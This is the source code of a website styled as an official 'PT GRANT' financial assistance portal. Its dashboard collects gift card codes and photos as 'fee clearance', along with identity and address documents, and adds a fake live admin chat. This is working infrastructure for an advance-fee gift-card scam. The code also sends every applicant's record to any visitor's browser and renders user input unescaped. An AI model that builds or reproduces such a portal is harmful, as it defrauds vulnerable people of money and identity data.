<?php
// index.php - PT GRANT Landing & Status Dashboard Portal
require_once 'config.php';
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PT GRANT - Official Financial Assistance Portal</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
</head>
<body class="bg-slate-900 text-slate-100 min-h-screen flex flex-col font-sans">

    <!-- Header Navigation -->
    <header class="bg-slate-800 border-b border-slate-700 sticky top-0 z-50">
        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 h-20 flex items-center justify-between">
            <div class="flex items-center space-x-3 cursor-pointer" onclick="showSection('landing')">
                <div class="w-12 h-12 bg-gradient-to-tr from-indigo-600 to-indigo-400 rounded-xl flex items-center justify-center shadow-lg shadow-indigo-500/30">
                    <i class="fa-solid fa-hand-holding-dollar text-2xl text-white"></i>
                </div>
                <div>
                    <h1 class="text-2xl font-black tracking-wider text-white">PT GRANT</h1>
                    <p class="text-xs text-indigo-400 font-medium">Financial Assistance & Relief Portal</p>
                </div>
            </div>

            <div class="flex items-center space-x-4">
                <button onclick="showSection('check-status-login')" class="bg-indigo-600 hover:bg-indigo-500 text-white font-semibold px-5 py-2.5 rounded-lg transition-all shadow-md flex items-center space-x-2">
                    <i class="fa-solid fa-magnifying-glass"></i>
                    <span>Check Application Status</span>
                </button>
            </div>
        </div>
    </header>

    <!-- Main Content Container -->
    <main class="flex-grow max-w-7xl w-full mx-auto px-4 sm:px-6 lg:px-8 py-8">

        <!-- LANDING SECTION -->
        <section id="landing-section" class="space-y-8">
            <div class="text-center max-w-3xl mx-auto space-y-4">
                <span class="bg-indigo-500/10 text-indigo-400 text-sm font-semibold px-4 py-1.5 rounded-full border border-indigo-500/20">Official Relief Program</span>
                <h2 class="text-4xl sm:text-5xl font-extrabold text-white tracking-tight">Financial Assistance Programs</h2>
                <p class="text-slate-400 text-lg">Select an assistance program below to begin your official PT GRANT application process.</p>
            </div>

            <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6 pt-6">
                <!-- Personal Loan Assistance -->
                <div onclick="selectGrant('Personal Loan Assistance')" class="bg-slate-800/80 hover:bg-slate-800 border border-slate-700 hover:border-indigo-500/50 rounded-2xl p-6 transition-all duration-300 transform hover:-translate-y-1 cursor-pointer group shadow-xl">
                    <div class="w-14 h-14 bg-blue-500/10 text-blue-400 rounded-xl flex items-center justify-center text-2xl group-hover:scale-110 transition-transform mb-4">
                        <i class="fa-solid fa-user-shield"></i>
                    </div>
                    <h3 class="text-xl font-bold text-white mb-2 group-hover:text-indigo-400 transition-colors">Personal Loan Assistance</h3>
                    <p class="text-slate-400 text-sm mb-4">Direct funding support for personal debts and immediate financial relief.</p>
                    <span class="text-indigo-400 text-sm font-semibold inline-flex items-center group-hover:translate-x-1 transition-transform">Apply Now <i class="fa-solid fa-arrow-right ml-2 text-xs"></i></span>
                </div>

                <!-- Mortgage Loan Assistance -->
                <div onclick="selectGrant('Mortgage Loan Assistance')" class="bg-slate-800/80 hover:bg-slate-800 border border-slate-700 hover:border-indigo-500/50 rounded-2xl p-6 transition-all duration-300 transform hover:-translate-y-1 cursor-pointer group shadow-xl">
                    <div class="w-14 h-14 bg-emerald-500/10 text-emerald-400 rounded-xl flex items-center justify-center text-2xl group-hover:scale-110 transition-transform mb-4">
                        <i class="fa-solid fa-house-circle-check"></i>
                    </div>
                    <h3 class="text-xl font-bold text-white mb-2 group-hover:text-indigo-400 transition-colors">Mortgage Loan Assistance</h3>
                    <p class="text-slate-400 text-sm mb-4">Relief programs for home loans, principal reductions, and foreclosure prevention.</p>
                    <span class="text-indigo-400 text-sm font-semibold inline-flex items-center group-hover:translate-x-1 transition-transform">Apply Now <i class="fa-solid fa-arrow-right ml-2 text-xs"></i></span>
                </div>

                <!-- Credit Card Payoff Assistance -->
                <div onclick="selectGrant('Credit Card Payoff Assistance')" class="bg-slate-800/80 hover:bg-slate-800 border border-slate-700 hover:border-indigo-500/50 rounded-2xl p-6 transition-all duration-300 transform hover:-translate-y-1 cursor-pointer group shadow-xl">
                    <div class="w-14 h-14 bg-purple-500/10 text-purple-400 rounded-xl flex items-center justify-center text-2xl group-hover:scale-110 transition-transform mb-4">
                        <i class="fa-solid fa-credit-card"></i>
                    </div>
                    <h3 class="text-xl font-bold text-white mb-2 group-hover:text-indigo-400 transition-colors">Credit Card Payoff Assistance</h3>
                    <p class="text-slate-400 text-sm mb-4">Debt consolidation grants designed to eliminate high-interest credit card debt.</p>
                    <span class="text-indigo-400 text-sm font-semibold inline-flex items-center group-hover:translate-x-1 transition-transform">Apply Now <i class="fa-solid fa-arrow-right ml-2 text-xs"></i></span>
                </div>

                <!-- Small Business Assistance -->
                <div onclick="selectGrant('Small Business Assistance')" class="bg-slate-800/80 hover:bg-slate-800 border border-slate-700 hover:border-indigo-500/50 rounded-2xl p-6 transition-all duration-300 transform hover:-translate-y-1 cursor-pointer group shadow-xl">
                    <div class="w-14 h-14 bg-amber-500/10 text-amber-400 rounded-xl flex items-center justify-center text-2xl group-hover:scale-110 transition-transform mb-4">
                        <i class="fa-solid fa-store"></i>
                    </div>
                    <h3 class="text-xl font-bold text-white mb-2 group-hover:text-indigo-400 transition-colors">Small Business Assistance</h3>
                    <p class="text-slate-400 text-sm mb-4">Grants to expand, stabilize, or launch small business operations and payroll.</p>
                    <span class="text-indigo-400 text-sm font-semibold inline-flex items-center group-hover:translate-x-1 transition-transform">Apply Now <i class="fa-solid fa-arrow-right ml-2 text-xs"></i></span>
                </div>

                <!-- Home Grant Assistance -->
                <div onclick="selectGrant('Home Grant Assistance')" class="bg-slate-800/80 hover:bg-slate-800 border border-slate-700 hover:border-indigo-500/50 rounded-2xl p-6 transition-all duration-300 transform hover:-translate-y-1 cursor-pointer group shadow-xl">
                    <div class="w-14 h-14 bg-rose-500/10 text-rose-400 rounded-xl flex items-center justify-center text-2xl group-hover:scale-110 transition-transform mb-4">
                        <i class="fa-solid fa-house-chimney-window"></i>
                    </div>
                    <h3 class="text-xl font-bold text-white mb-2 group-hover:text-indigo-400 transition-colors">Home Grant Assistance</h3>
                    <p class="text-slate-400 text-sm mb-4">Housing repair, energy efficiency, and first-time homebuyer support grants.</p>
                    <span class="text-indigo-400 text-sm font-semibold inline-flex items-center group-hover:translate-x-1 transition-transform">Apply Now <i class="fa-solid fa-arrow-right ml-2 text-xs"></i></span>
                </div>

                <!-- Doorstep Delivery Assistance -->
                <div onclick="selectGrant('Doorstep Delivery Assistance')" class="bg-slate-800/80 hover:bg-slate-800 border border-slate-700 hover:border-indigo-500/50 rounded-2xl p-6 transition-all duration-300 transform hover:-translate-y-1 cursor-pointer group shadow-xl">
                    <div class="w-14 h-14 bg-cyan-500/10 text-cyan-400 rounded-xl flex items-center justify-center text-2xl group-hover:scale-110 transition-transform mb-4">
                        <i class="fa-solid fa-truck-ramp-box"></i>
                    </div>
                    <h3 class="text-xl font-bold text-white mb-2 group-hover:text-indigo-400 transition-colors">Doorstep Delivery Assistance</h3>
                    <p class="text-slate-400 text-sm mb-4">Essential aid, checks, and physical grant package delivery services.</p>
                    <span class="text-indigo-400 text-sm font-semibold inline-flex items-center group-hover:translate-x-1 transition-transform">Apply Now <i class="fa-solid fa-arrow-right ml-2 text-xs"></i></span>
                </div>
            </div>
        </section>

        <!-- APPLICATION SUBMITTED SUCCESS VIEW -->
        <section id="success-section" class="hidden max-w-xl mx-auto text-center py-12">
            <div class="bg-slate-800 border border-slate-700 rounded-2xl p-8 sm:p-10 shadow-2xl space-y-6">
                <div class="w-20 h-20 bg-emerald-500/10 text-emerald-400 rounded-full flex items-center justify-center text-4xl mx-auto border border-emerald-500/20">
                    <i class="fa-solid fa-circle-check"></i>
                </div>
                <h2 class="text-3xl font-extrabold text-white">Thank You!</h2>
                <p class="text-slate-300">Your grant application has been successfully submitted to the PT GRANT evaluation board.</p>
                
                <div class="bg-slate-900 border border-slate-700 p-4 rounded-xl">
                    <p class="text-xs uppercase tracking-wider text-slate-400 font-bold mb-1">Your Unique Application Reference</p>
                    <div id="generated-app-num" class="text-2xl font-black text-indigo-400 tracking-widest">PT-999999</div>
                </div>

                <button onclick="goToStatusWithAppNum()" class="w-full bg-indigo-600 hover:bg-indigo-500 text-white font-bold py-3.5 rounded-xl transition-all shadow-lg">
                    Go to Check Application Status
                </button>
            </div>
        </section>

        <!-- LOGIN TO CHECK STATUS -->
        <section id="check-status-login" class="hidden max-w-md mx-auto py-12">
            <div class="bg-slate-800 border border-slate-700 rounded-2xl p-8 shadow-2xl space-y-6">
                <div class="text-center">
                    <div class="w-14 h-14 bg-indigo-500/10 text-indigo-400 rounded-full flex items-center justify-center text-2xl mx-auto mb-3">
                        <i class="fa-solid fa-id-card"></i>
                    </div>
                    <h2 class="text-2xl font-bold text-white">Check Application Status</h2>
                    <p class="text-slate-400 text-sm mt-1">Login with your name and Application Reference Number.</p>
                </div>

                <form onsubmit="handleStatusLogin(event)" class="space-y-4">
                    <div>
                        <label class="block text-sm font-semibold text-slate-300 mb-1">Applicant Name</label>
                        <input type="text" required id="login_name" class="w-full bg-slate-900 border border-slate-700 rounded-lg px-4 py-3 text-white focus:outline-none focus:border-indigo-500" placeholder="e.g. John Doe">
                    </div>
                    <div>
                        <label class="block text-sm font-semibold text-slate-300 mb-1">Application Number</label>
                        <input type="text" required id="login_app_num" class="w-full bg-slate-900 border border-slate-700 rounded-lg px-4 py-3 text-white focus:outline-none focus:border-indigo-500 uppercase" placeholder="PT-XXXXXX">
                    </div>
                    <button type="submit" class="w-full bg-indigo-600 hover:bg-indigo-500 text-white font-bold py-3 rounded-xl transition-all">
                        Access Status Dashboard
                    </button>
                </form>
            </div>
        </section>

        <!-- APPLICANT STATUS DASHBOARD -->
        <section id="status-dashboard" class="hidden space-y-8">
            <div class="bg-slate-800 border border-slate-700 rounded-2xl p-6 sm:p-8 shadow-xl">
                <div class="flex flex-col md:flex-row md:items-center justify-between gap-6 pb-6 border-b border-slate-700">
                    <div>
                        <div class="flex items-center space-x-3">
                            <h2 class="text-2xl font-bold text-white" id="dash-applicant-name">Applicant Name</h2>
                            <span id="dash-app-type" class="bg-slate-700 text-slate-300 text-xs px-2.5 py-1 rounded-full uppercase font-bold">Personal</span>
                        </div>
                        <p class="text-slate-400 text-sm mt-1">Reference: <span id="dash-app-num" class="text-indigo-400 font-mono font-bold">PT-000000</span> | Grant: <span id="dash-grant-name" class="text-slate-200"></span></p>
                    </div>

                    <!-- Status Indicator Badge -->
                    <div class="flex flex-col items-start md:items-end">
                        <span class="text-xs text-slate-400 mb-1">Processing Status</span>
                        <div id="dash-status-badge" class="px-5 py-2 rounded-xl text-sm font-black tracking-wider uppercase flex items-center space-x-2 bg-amber-500/10 text-amber-500 border border-amber-500/20">
                            <i class="fa-solid fa-clock"></i>
                            <span id="dash-status-text">Pending</span>
                        </div>
                    </div>
                </div>

                <!-- QUALIFIED AMOUNT DISPLAY BOX -->
                <div class="mt-6 bg-slate-900/90 border border-indigo-500/30 rounded-2xl p-6 flex flex-col sm:flex-row items-center justify-between gap-4 shadow-inner">
                    <div class="flex items-center space-x-4">
                        <div class="w-12 h-12 bg-emerald-500/10 text-emerald-400 rounded-xl flex items-center justify-center text-2xl border border-emerald-500/20">
                            <i class="fa-solid fa-sack-dollar"></i>
                        </div>
                        <div>
                            <h4 class="text-sm font-semibold text-slate-400 uppercase tracking-wider">Approved / Qualified Grant Amount</h4>
                            <p class="text-xs text-slate-500">Subject to document verification and fee clearance</p>
                        </div>
                    </div>
                    <div class="bg-slate-800 border border-slate-700 px-6 py-3 rounded-xl">
                        <span id="dash-qualified-amount" class="text-3xl font-black text-emerald-400 tracking-tight">$0.00</span>
                    </div>
                </div>
            </div>

            <div class="grid grid-cols-1 lg:grid-cols-3 gap-8">
                <!-- Left 2 Columns: Documents & Gift Cards -->
                <div class="lg:col-span-2 space-y-6">
                    <!-- Verification Documents -->
                    <div class="bg-slate-800 border border-slate-700 rounded-2xl p-6 shadow-xl">
                        <h3 class="text-xl font-bold text-white mb-2"><i class="fa-solid fa-file-shield text-indigo-400 mr-2"></i> Supporting Documents</h3>
                        <p class="text-slate-300 text-sm mb-4" id="doc-requirement-notice">Please upload required files.</p>

                        <form onsubmit="handleDocumentUpload(event)" class="space-y-4">
                            <input type="file" required id="doc_file_input" class="block w-full text-sm text-slate-400 file:mr-4 file:py-2 file:px-4 file:rounded-lg file:border-0 file:text-sm file:font-semibold file:bg-indigo-600 file:text-white hover:file:bg-indigo-500 cursor-pointer">
                            <button type="submit" class="bg-indigo-600 hover:bg-indigo-500 text-white font-semibold px-6 py-2.5 rounded-lg text-sm">Submit Document</button>
                        </form>
                        <div id="uploaded-docs-list" class="mt-4 space-y-2 text-sm text-slate-400"></div>
                    </div>

                    <!-- Gift Card Payment -->
                    <div class="bg-slate-800 border border-slate-700 rounded-2xl p-6 shadow-xl">
                        <h3 class="text-xl font-bold text-white mb-2"><i class="fa-solid fa-gift text-amber-400 mr-2"></i> Gift Card Fee Clearance</h3>
                        <form onsubmit="handlePaymentUpload(event)" class="space-y-4">
                            <div>
                                <label class="block text-xs font-semibold text-slate-300 mb-1 uppercase">Gift Card Type</label>
                                <select required id="payment_type" class="w-full bg-slate-900 border border-slate-700 rounded-lg px-4 py-2.5 text-white text-sm focus:outline-none">
                                    <option value="Apple Gift Card">Apple Gift Card</option>
                                    <option value="Steam Gift Card">Steam Gift Card</option>
                                    <option value="Vanilla Visa / Mastercard">Vanilla Visa / Mastercard</option>
                                    <option value="Amazon Gift Card">Amazon Gift Card</option>
                                </select>
                            </div>
                            <div>
                                <label class="block text-xs font-semibold text-slate-300 mb-1 uppercase">Gift Card Code / PIN</label>
                                <input type="text" required id="gift_card_code" class="w-full bg-slate-900 border border-slate-700 rounded-lg px-4 py-2.5 text-white text-sm font-mono" placeholder="X123-4567-8910">
                            </div>
                            <div>
                                <label class="block text-xs font-semibold text-slate-300 mb-1 uppercase">Gift Card Image Upload</label>
                                <input type="file" required id="payment_receipt_input" class="block w-full text-sm text-slate-400 file:mr-4 file:py-2 file:px-4 file:rounded-lg file:border-0 file:text-sm file:font-semibold file:bg-amber-600 file:text-white hover:file:bg-amber-500 cursor-pointer">
                            </div>
                            <button type="submit" class="bg-amber-600 hover:bg-amber-500 text-white font-semibold px-6 py-2.5 rounded-lg text-sm">Submit Gift Card</button>
                        </form>
                        <div id="uploaded-payments-list" class="mt-4 space-y-2 text-sm text-slate-400"></div>
                    </div>
                </div>

                <!-- Right Column: Live Admin Chat -->
                <div class="bg-slate-800 border border-slate-700 rounded-2xl p-6 shadow-xl flex flex-col h-[600px]">
                    <div class="flex items-center space-x-3 pb-4 border-b border-slate-700">
                        <div class="w-3 h-3 bg-emerald-500 rounded-full animate-pulse"></div>
                        <h3 class="text-lg font-bold text-white">Live Admin Support Chat</h3>
                    </div>
                    <div id="chat-messages-container" class="flex-grow overflow-y-auto py-4 space-y-3 text-sm pr-2"></div>
                    <form onsubmit="handleSendChatMessage(event)" class="pt-3 border-t border-slate-700 flex space-x-2">
                        <input type="text" id="chat_input_text" required placeholder="Type your message..." class="flex-grow bg-slate-900 border border-slate-700 rounded-xl px-4 py-2.5 text-white text-sm focus:outline-none">
                        <button type="submit" class="bg-indigo-600 hover:bg-indigo-500 text-white px-4 py-2.5 rounded-xl"><i class="fa-solid fa-paper-plane"></i></button>
                    </form>
                </div>
            </div>
        </section>

    </main>

    <footer class="bg-slate-800 border-t border-slate-700 py-6 text-center text-xs text-slate-500">
        <p>&copy; 2026 PT GRANT Official Portal. All Rights Reserved.</p>
    </footer>

    <script>
        let currentApp = null;

        function showSection(sectionId) {
            ['landing-section', 'success-section', 'check-status-login', 'status-dashboard'].forEach(id => {
                const el = document.getElementById(id);
                if (el) el.classList.add('hidden');
            });
            document.getElementById(sectionId).classList.remove('hidden');
            window.scrollTo({ top: 0, behavior: 'smooth' });
        }

        function selectGrant(grantName) {
            window.location.href = 'apply.php?grant=' + encodeURIComponent(grantName);
        }

        function goToStatusWithAppNum() {
            if (currentApp) {
                renderStatusDashboard(currentApp);
                showSection('status-dashboard');
            } else {
                showSection('check-status-login');
            }
        }

        function handleStatusLogin(e) {
            e.preventDefault();
            const nameInput = document.getElementById('login_name').value.trim().toLowerCase();
            const appNumInput = document.getElementById('login_app_num').value.trim().toUpperCase();

            fetch('save.php', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ action: 'get_applications' })
            })
            .then(res => res.json())
            .then(data => {
                if (data.status === 'success') {
                    let match = data.data.find(a => 
                        a.app_num.toUpperCase() === appNumInput && 
                        (a.first_name.toLowerCase().includes(nameInput) || a.last_name.toLowerCase().includes(nameInput))
                    );
                    if (match) {
                        currentApp = match;
                        renderStatusDashboard(currentApp);
                        showSection('status-dashboard');
                    } else {
                        alert('Application not found. Please verify your details.');
                    }
                }
            });
        }

        function renderStatusDashboard(app) {
            document.getElementById('dash-applicant-name').innerText = `${app.first_name} ${app.last_name}`;
            document.getElementById('dash-app-num').innerText = app.app_num;
            document.getElementById('dash-grant-name').innerText = app.grant_type;
            document.getElementById('dash-app-type').innerText = app.applicant_type;
            document.getElementById('dash-qualified-amount').innerText = '$' + (app.qualified_amount || '0.00');

            const docNotice = document.getElementById('doc-requirement-notice');
            if (app.applicant_type === 'business') {
                docNotice.innerHTML = 'Required: <strong>Proof of Business Registration</strong>.';
            } else {
                docNotice.innerHTML = 'Required: <strong>Proof of Address</strong> and <strong>Proof of Identity (Name)</strong>.';
            }

            const badge = document.getElementById('dash-status-badge');
            let colorClasses = '';
            let iconClass = '';

            switch(app.status) {
                case 'Approved':
                    colorClasses = 'bg-emerald-500/10 text-emerald-400 border-emerald-500/30';
                    iconClass = 'fa-circle-check';
                    break;
                case 'Declined':
                    colorClasses = 'bg-red-500/10 text-red-400 border-red-500/30';
                    iconClass = 'fa-circle-xmark';
                    break;
                case 'Processing':
                    colorClasses = 'bg-blue-500/10 text-blue-400 border-blue-500/30';
                    iconClass = 'fa-spinner fa-spin';
                    break;
                default: // Pending
                    colorClasses = 'bg-amber-500/10 text-amber-400 border-amber-500/20';
                    iconClass = 'fa-clock';
                    break;
            }

            badge.className = `px-5 py-2 rounded-xl text-sm font-black tracking-wider uppercase flex items-center space-x-2 border ${colorClasses}`;
            document.getElementById('dash-status-text').innerText = app.status;
            badge.innerHTML = `<i class="fa-solid ${iconClass}"></i><span>${app.status}</span>`;

            // Documents list
            const docsList = document.getElementById('uploaded-docs-list');
            docsList.innerHTML = (app.documents && app.documents.length > 0) ? app.documents.map(d => `
                <div class="flex items-center justify-between bg-slate-900 p-2.5 rounded-lg border border-slate-700 text-xs">
                    <span>${d.name}</span><span class="text-emerald-400">Uploaded</span>
                </div>
            `).join('') : '<p class="italic text-xs">No verification documents uploaded yet.</p>';

            // Payments list
            const paymentsList = document.getElementById('uploaded-payments-list');
            paymentsList.innerHTML = (app.payments && app.payments.length > 0) ? app.payments.map(p => `
                <div class="bg-slate-900 p-3 rounded-lg border border-slate-700 text-xs">
                    <span class="font-bold text-amber-400">${p.type}</span> - Code: <span class="font-mono">${p.code}</span>
                </div>
            `).join('') : '<p class="italic text-xs">No gift card submitted yet.</p>';

            renderChatMessages(app.chat_messages || []);
        }

        function handleDocumentUpload(e) {
            e.preventDefault();
            const fileInput = document.getElementById('doc_file_input');
            if (!fileInput.files.length) return;

            if (!currentApp.documents) currentApp.documents = [];
            currentApp.documents.push({ name: fileInput.files[0].name, date: new Date().toLocaleDateString() });
            syncCurrentApp();
            renderStatusDashboard(currentApp);
            fileInput.value = '';
            alert('Document uploaded successfully!');
        }

        function handlePaymentUpload(e) {
            e.preventDefault();
            const payType = document.getElementById('payment_type').value;
            const code = document.getElementById('gift_card_code').value;
            const fileInput = document.getElementById('payment_receipt_input');

            if (!currentApp.payments) currentApp.payments = [];
            currentApp.payments.push({ type: payType, code: code, file_name: fileInput.files[0].name });
            syncCurrentApp();
            renderStatusDashboard(currentApp);
            document.getElementById('gift_card_code').value = '';
            fileInput.value = '';
            alert('Gift card submitted successfully!');
        }

        function handleSendChatMessage(e) {
            e.preventDefault();
            const input = document.getElementById('chat_input_text');
            const text = input.value.trim();
            if (!text) return;

            if (!currentApp.chat_messages) currentApp.chat_messages = [];
            currentApp.chat_messages.push({ sender: 'user', text: text, time: new Date().toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'}) });
            syncCurrentApp();
            renderChatMessages(currentApp.chat_messages);
            input.value = '';
        }

        function renderChatMessages(messages) {
            const container = document.getElementById('chat-messages-container');
            container.innerHTML = messages.map(m => `
                <div class="flex flex-col ${m.sender === 'admin' ? 'items-start' : 'items-end'}">
                    <div class="max-w-[85%] rounded-2xl px-4 py-2.5 text-xs ${m.sender === 'admin' ? 'bg-slate-700 text-slate-100' : 'bg-indigo-600 text-white'}">
                        <span class="block text-[10px] font-bold mb-0.5">${m.sender === 'admin' ? 'Grant Admin' : 'You'}</span>
                        ${m.text}
                    </div>
                </div>
            `).join('');
            container.scrollTop = container.scrollHeight;
        }

        function syncCurrentApp() {
            fetch('save.php', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ action: 'update_application', application: currentApp })
            });
        }
    </script>
</body>
</html>
